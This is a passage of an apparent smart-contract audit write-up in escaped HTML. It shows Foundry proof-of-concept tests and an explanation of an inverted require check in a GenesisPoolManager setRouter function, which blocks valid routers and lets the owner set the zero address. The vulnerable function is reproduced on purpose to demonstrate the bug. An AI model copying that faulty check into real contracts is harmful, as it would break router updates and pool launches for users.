class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Expect ZA (Zero Address) error due to the faulty require\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Router should remain unchanged\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router was changed when it shouldn\u0026#39;t have been\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_ownerCanSetRouterToZeroAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This call will succeed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router was not set to address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_nonOwnerCannotCallSetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_launchFailsIfRouterIsZero\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// First, owner sets router to address(0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router setup for test failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Now, owner tries to launch a pool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The mockPool\u0026#39;s launch function will revert if router is address(0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Also, the call to IRouter(address(0)).addLiquidity would revert.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router is address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertFalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Launch should not have been successfully called on pool due to revert\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_launchSucceedsIfRouterIsValid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure router is the initial, valid one\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Initial router setup for test failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Owner tries to launch a pool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This should succeed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertTrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Launch was not called on pool\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pool was launched with incorrect router\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertTrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router\u0026#39;s addLiquidity was not called\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003ch3 id=\"explanation-of-the-poc\" style=\"position:relative;\"\u003e\u003ca href=\"#explanation-of-the-poc\" aria-label=\"explanation of the poc permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExplanation of the PoC\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eSimplifiedGenesisPoolManager\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eContains the \u003ccode\u003eowner\u003c/code\u003e, \u003ccode\u003erouter\u003c/code\u003e state variable, and the vulnerable \u003ccode\u003esetRouter\u003c/code\u003e function exactly as described.\u003c/li\u003e\n\u003cli\u003eIncludes a \u003ccode\u003econstructor\u003c/code\u003e to set the initial owner and router.\u003c/li\u003e\n\u003cli\u003eIncludes \u003ccode\u003e_launchPool\u003c/code\u003e and \u003ccode\u003etestLaunch\u003c/code\u003e to simulate the scenario where a zero router would cause a failure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eMockRouter\u003c/code\u003e:\u003c/strong\u003e A simple contract implementing \u003ccode\u003eIRouter\u003c/code\u003e. Its \u003ccode\u003eaddLiquidity\u003c/code\u003e function sets a flag \u003ccode\u003ewasCalled\u003c/code\u003e to verify interaction.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eMockGenesisPool\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eImplements a \u003ccode\u003elaunch\u003c/code\u003e function.\u003c/li\u003e\n\u003cli\u003eCrucially, \u003ccode\u003elaunch\u003c/code\u003e will \u003ccode\u003erevert(\"Router is address(0)\");\u003c/code\u003e if the \u003ccode\u003e_router\u003c/code\u003e argument is \u003ccode\u003eaddress(0)\u003c/code\u003e, mimicking how a real \u003ccode\u003elaunch\u003c/code\u003e would fail if it tried to call \u003ccode\u003eIRouter(address(0)).addLiquidity(...)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIt also attempts to call \u003ccode\u003eIRouter(_router).addLiquidity\u003c/code\u003e to show a successful interaction.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eMockPairFactory\u003c/code\u003e:\u003c/strong\u003e A minimal mock for \u003ccode\u003eIBaseV1Factory\u003c/code\u003e to satisfy dependencies in the simplified \u003ccode\u003e_launchPool\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eGenesisPoolManagerRouterTest\u003c/code\u003e (Test Contract):\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esetUp()\u003c/code\u003e:\u003c/strong\u003e Deploys the \u003ccode\u003eSimplifiedGenesisPoolManager\u003c/code\u003e, \u003ccode\u003eMockRouter\u003c/code\u003e instances, \u003ccode\u003eMockGenesisPool\u003c/code\u003e, and sets the test contract as the \u003ccode\u003eowner\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_ownerCannotSetValidNewRouter()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e attempts to call \u003ccode\u003esetRouter\u003c/code\u003e with \u003ccode\u003enewValidRouter\u003c/code\u003e (a non-zero address).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evm.expectRevert(\"ZA\");\u003c/code\u003e asserts that this call reverts with the “ZA” error, proving the \u003ccode\u003erequire(_router == address(0), \"ZA\");\u003c/code\u003e condition is problematic for valid addresses.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_ownerCanSetRouterToZeroAddress()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003esetRouter\u003c/code\u003e with \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis call 